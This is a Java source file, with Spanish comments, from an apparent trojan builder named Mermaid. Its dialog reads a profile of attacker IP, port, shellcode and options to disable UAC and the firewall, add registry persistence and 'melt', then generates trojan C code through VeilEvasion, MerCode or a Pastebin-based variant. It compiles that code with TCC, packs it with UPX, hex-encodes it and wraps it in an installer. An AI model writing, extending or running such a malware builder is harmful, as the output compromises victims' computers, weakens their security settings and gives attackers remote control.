package net.jlxip.mermaid;

import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.io.BufferedReader;
import java.io.File;
import java.io.FileReader;
import java.io.IOException;
import java.util.regex.Pattern;

import javax.swing.JButton;
import javax.swing.JCheckBox;
import javax.swing.JDialog;
import javax.swing.JFileChooser;
import javax.swing.JLabel;
import javax.swing.JOptionPane;
import javax.swing.JTextField;

import net.jlxip.mermaid.exploits.MerCode;
import net.jlxip.mermaid.exploits.MerCodeBin;
import net.jlxip.mermaid.exploits.VeilEvasion;

public class Build extends JDialog {
	private static final long serialVersionUID = 1L;
	private JTextField output;
	private JLabel estimated;
	private JCheckBox upx;
	
	Profile PROFILE;
    Boolean debug;

	/**
	 * Create the dialog.
	 */
	public Build(java.awt.Frame parent, boolean modal, Profile recvProfile, Boolean recvDebug) {
		super(parent, modal);
        PROFILE = recvProfile;  // Establecemos la variable global PROFILE con el perfil recibido para que lo puedan usar otros métodos
        debug = recvDebug;  // Establecemos la variable debug
		setBounds(100, 100, 450, 189);
		getContentPane().setLayout(null);
		setLocationRelativeTo(null);
		JDialog me = this;
		{
			JLabel lblJasdf = new JLabel("Output:");
			lblJasdf.setBounds(12, 13, 43, 16);
			getContentPane().add(lblJasdf);
		}
		{
			output = new JTextField();
			output.setBounds(67, 10, 298, 28);
			getContentPane().add(output);
			output.setColumns(10);
		}
		{
			JButton btnNewButton = new JButton("...");
			btnNewButton.addActionListener(new ActionListener() {
				public void actionPerformed(ActionEvent e) {
					// PEDIR RUTA PARA ALMACENAR EL EXPLOIT
			        JFileChooser fileChooser = new JFileChooser();  // Creamos un nuevo selector de archivos
			        fileChooser.setMultiSelectionEnabled(false);    // Deshabilitamos la multiselección
			        String path = "";   // Creamos un String
			        try{
			            path = new File(".").getCanonicalPath();    // y en él guardamos la ruta actual (la del archivo Mermaid.jar)
			        } catch (IOException ex) {
			            ex.printStackTrace();
			        }
			        
			        File file = new File(path);     // Abrimos en un File la ruta
			        fileChooser.setCurrentDirectory(file);  // Y establemos al selector de archivos la ruta inicial como la actual
			        fileChooser.showSaveDialog(me);   // Abrimos la ventana para GUARDAR
			        
			        Pattern raw_dot_pattern = Pattern.compile(Pattern.quote("."));  // Creamos un patrón para dividir Strings mediante el punto
			        String output_dots[] = raw_dot_pattern.split(fileChooser.getSelectedFile().getAbsolutePath());  // Dividimos el archivo seleccionado en un array de Strings
			        if(output_dots[output_dots.length-1].equals("exe")){    // Si el archivo seleccionado NO tiene la terminación ".exe"...
			            output.setText(fileChooser.getSelectedFile().getAbsolutePath());    // Se la añadimos
			        } else {    // Si sí la tiene...
			            output.setText(fileChooser.getSelectedFile().getAbsolutePath()+".exe"); // Lo dejamos como está
			        }
				}
			});
			btnNewButton.setBounds(377, 9, 43, 25);
			getContentPane().add(btnNewButton);
		}
		{
			upx = new JCheckBox("UPX");
			upx.addActionListener(new ActionListener() {
				public void actionPerformed(ActionEvent e) {
					if(upx.isSelected()){   // Si el JCheckBox de UPX está seleccionado
			            estimated.setText("Estimated size of the exploit: ~5kb");  // Ponemos que el peso final será de alrededor de 5kb
			        } else {    // De otro modo...
			            estimated.setText("Estimated size of the exploit: ~8kb");  // Ponemos que el peso final será de alrededor de 8kb
			        }
				}
			});
			upx.setBounds(24, 54, 51, 25);
			getContentPane().add(upx);
		}
		{
			estimated = new JLabel("Estimated size of the exploit: ~8kb");
			estimated.setBounds(204, 58, 198, 16);
			getContentPane().add(estimated);
		}
		{
			JButton btnBuild = new JButton("BUILD");
			btnBuild.addActionListener(new ActionListener() {
				@SuppressWarnings("resource")
				public void actionPerformed(ActionEvent e) {
					String EXPLOIT = PROFILE.EXPLOIT;					// Cargamos los datos del perfil
					String IP = PROFILE.IP;                             // "
			        String PORT = PROFILE.PORT;                         // "
			        String PATH = PROFILE.PATH;                         // "
			        String FILENAME = PROFILE.FILE;                     // "
			        String ADFOLDER = PROFILE.ADFOLDER;                 // "
			        String HKCU = PROFILE.HKCU;                         // "
			        String HKLM = PROFILE.HKLM;                         // "
			        String DISABLEUAC = PROFILE.DISABLEUAC;             // "
			        String DISABLEFIREWALL = PROFILE.DISABLEFIREWALL;   // "
			        String ADDFIREWALL = PROFILE.ADDFIREWALL;           // "
			        String MELT = PROFILE.MELT;                         // "
			        String SHELLCODE = PROFILE.SHELLCODE;				// "
			        
			        // PRIMER PASO: CREAR EL EXPLOIT
			        File choosed = new File(output.getText());  // Hacemos un nuevo archivo con la ruta especificada
			        String choosedPath = choosed.getAbsolutePath();     // Sacamos la ruta en un String
			        Pattern raw_slatch_pattern = Pattern.compile(Pattern.quote(File.separator));  // Hacemos un nuevo patrón para separar Strings con el separador del sistema operativo: \ en Windows y / en Linux y MAC OS X
			        String[] slatches = raw_slatch_pattern.split(choosedPath);      // Separamos la variable con la ruta en un array de Strings

			        String choosedFolderPath = "";      // Variable para almacenar la carpeta donde se creará el exploit
			        for(int i=0;i<slatches.length-1;i++){   // Por cada separador... (menos el último)
			            choosedFolderPath = choosedFolderPath + slatches[i] + File.separator; // Añadimos a choosedFolderPath, el separador actual y el separador del sistema
			        }
			        
			        File trojan = new File(choosedFolderPath + "temp.c");   // En la carpeta de antes, abrimos (creamos) el archivo "temp.c"
			        
			        
			        String PastebinAPIDevKey = null;
			        if(EXPLOIT.equals("VEILEVASION")) VeilEvasion.generate(trojan, IP, PORT);
			        else if(EXPLOIT.equals("MERCODE")) MerCode.generate(trojan, SHELLCODE);
			        else if(EXPLOIT.equals("MERCODEBIN")) {
			        	File FPastebinAPIDevKey = new File("MerCodeBin.dat");
			        	if(!FPastebinAPIDevKey.exists()) {
			        		JOptionPane.showMessageDialog(null, "No 'MerCodeBin.dat' file was found.");
			        		return;
			        	}
			        	
			        	try {
			        		FileReader fr = new FileReader(FPastebinAPIDevKey);
			        		BufferedReader br = new BufferedReader(fr);
			        		
			        		PastebinAPIDevKey = br.readLine();
			        		if(PastebinAPIDevKey == null || PastebinAPIDevKey.equals("")) {
			        			JOptionPane.showMessageDialog(null, "'MerCodeBin.dat' file is corrupt.");
			        			return;
			        		}
			        		
			        		br.close();
			        		fr.close();
			        	} catch(IOException ioe) {
			        		ioe.printStackTrace();
			        	}
			        	
			        	if(!MerCodeBin.generate(trojan, SHELLCODE, PastebinAPIDevKey)) {
			        		return;
			        	}
			        	
			        	// TODO
			        }
			        
			        COMPILAR(trojan.getAbsolutePath()); // Compilamos el código generado
			        if(!debug) trojan.delete();            // Eliminamos el archivo "temp.c"
			        
			        File tempEXE = new File(choosedFolderPath + "temp.exe");    // En la carpeta de antes, abrimos (creamos) el archivo "temp.exe"
			        
			        if(upx.isSelected()){       // Si se ha seleccionado UPX
			            UPX(tempEXE.getAbsolutePath());     // Pasar ejecutable temporal por UPX
			        }
			        
			        // SEGUNDO PASO: CONVERTIR ARCHIVO COMPILADO A HEXADECIMAL			        
			        String HEXEDFILE = GenerateHexTrojan.generate(tempEXE);    // Almacenamos en un String la llamada a GenerateHexTrojan con el ejecutable temporal como argumento
			        
			        if(!debug) tempEXE.delete();           // Eliminamos el archivo "temp.exe"
			        
			        // TERCER PASO: CREAR EL INSTALADOR
			        String CFILE = GenerateInstaller.generate(choosed, PATH, FILENAME, ADFOLDER, HKCU, HKLM, DISABLEUAC, DISABLEFIREWALL, ADDFIREWALL, PORT, MELT, HEXEDFILE);    // Guardamos en un String la ruta del código fuente del instalador

			        COMPILAR(CFILE);        // Lo compilamos
			        File FileCFILE = new File(CFILE);       // Lo abrimos en un archivo

			        if(!debug){ // Si NO estamos en modo debug...
			            FileCFILE.delete();                     // Lo eliminamos
			        }

			        if(upx.isSelected()){       // Si UPX está seleccionado
			            UPX(choosed.getAbsolutePath());     // Pasar el instalador por UPX
			        }
			        
			        JOptionPane.showMessageDialog(me, "The exploit has been generated.");     // Creamos un mensaje de texto que aclara que el exploit ha sido generado
			        dispose();
				}
			});
			btnBuild.setBounds(12, 88, 408, 43);
			getContentPane().add(btnBuild);
		}
	}
	
	
	private void COMPILAR(String file){     // FUNCIÓN PARA COMPILAR CÓDIGO C
        String tcc = "tcc/tcc.exe";     // Creamos un String donde se almacenará la línea de comandos a ejecutar, con el ejecutable de TCC
        tcc = tcc + " \""+file+"\"";    // el archivo recibido como parámetro (importante: entre comillas, porque puede fallar si tiene espacios)
        tcc = tcc + " ws2_32.def";      // añadimos el archivo "ws2_32.def" al compilador
        tcc = tcc + " -luser32";        // añadimos la librería "user32"
        tcc = tcc + " -lkernel32";      // añadimos la librería "kernel32"

        if(System.getProperty("os.name").equals("Linux") | System.getProperty("os.name").equalsIgnoreCase("MAC OS X")){     // Si el sistema operativo es Linux o MAC OS X
            try{
                String command = "wine "+tcc;   // Añadimos "wine" al principio de la línea de comandos, para ejecutarlo con wine, obvio ¬.¬
                Process p = Runtime.getRuntime().exec(command); // Ejecutamos el comando
                p.waitFor();    // Y esperamos a que acabe (muy importante)
            } catch (IOException ex) {
                ex.printStackTrace();
            } catch (InterruptedException ex) {
                ex.printStackTrace();
            }
        } else {
            try{
                Process p = Runtime.getRuntime().exec(tcc); // Ejecutamos el comando
                p.waitFor();    // Y esperamos a que acabe (muy importante)
            } catch (IOException ex) {
                ex.printStackTrace();
            } catch (InterruptedException ex) {
                ex.printStackTrace();
            }
        }
    }
    
    private void UPX(String file){      // FUNCIÓN PARA PASAR POR UPX EL ARCHIVO
        String UPXcommand = "upx/upx.exe \""+file+"\"";     // Creamos la línea de comandos para pasar el archivo del argumento por UPX (también entre comillas)
        
        if(System.getProperty("os.name").equals("Linux") | System.getProperty("os.name").equalsIgnoreCase("MAC OS X")){     // Si es Linux o MAC OS X...
            try{
                String command = "wine "+UPXcommand;    // Añadimos "wine" al principio de la línea de comandos
                Process p = Runtime.getRuntime().exec(command);     // Ejecutamos
                p.waitFor();        // Y esperamos a que termine (muy importante)
            } catch (IOException ex) {
                JOptionPane.showMessageDialog(this, "Couldn't locate UPX. Disabling...");
                upx.setSelected(false); // No se pudo encontrar UPX, se deshabilita porque no es crucial
            } catch (InterruptedException ex) {
                ex.printStackTrace();
            }
        } else {
            try{
                Process p = Runtime.getRuntime().exec(UPXcommand); // Ejecutamos
                p.waitFor();        // Y esperamos a que termine (muy importante);
            } catch (IOException ex) {
                JOptionPane.showMessageDialog(this, "Couldn't locate UPX. Disabling...");
                upx.setSelected(false); // No se pudo encontrar UPX, se deshabilita porque no es crucial
            } catch (InterruptedException ex) {
                ex.printStackTrace();
            }
        }
    }
}
